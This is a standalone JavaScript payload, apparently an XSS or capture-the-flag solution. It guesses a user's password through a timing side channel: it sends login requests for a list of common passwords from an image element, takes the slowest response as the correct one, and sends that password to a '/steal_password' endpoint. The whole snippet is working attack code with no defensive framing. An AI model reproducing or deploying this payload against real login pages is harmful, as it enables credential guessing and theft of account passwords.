(function () {
    const dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
    const test = document.getElementById(`test`);
    async function timeForPwd(password) {
        const url = `/get_login?username=userx&password=${password}`;
        const start = new Date();
        return new Promise((resolve, reject) => {
            test.addEventListener('error', () => {
                const end = new Date();
                console.log(`Time elapsed for ${password}: ${end - start}`);
                resolve(end - start);
            }, { once: true });
            test.src = url;
        });
    }
    async function main() {
        let maxResponseTime = 0;
        let maxResponseTimePwd = '';
        for (const pwd of dictionary) {
            const time = await timeForPwd(pwd);
            if (time > maxResponseTime) {
                maxResponseTime = time;
                maxResponseTimePwd = pwd;
            }
        }
        console.log(`Max response time: ${maxResponseTime} for password: ${maxResponseTimePwd}`);
        test.src = `/steal_password?password=${maxResponseTimePwd}&timeElapsed=${maxResponseTime}`;
    }
    main();
})();
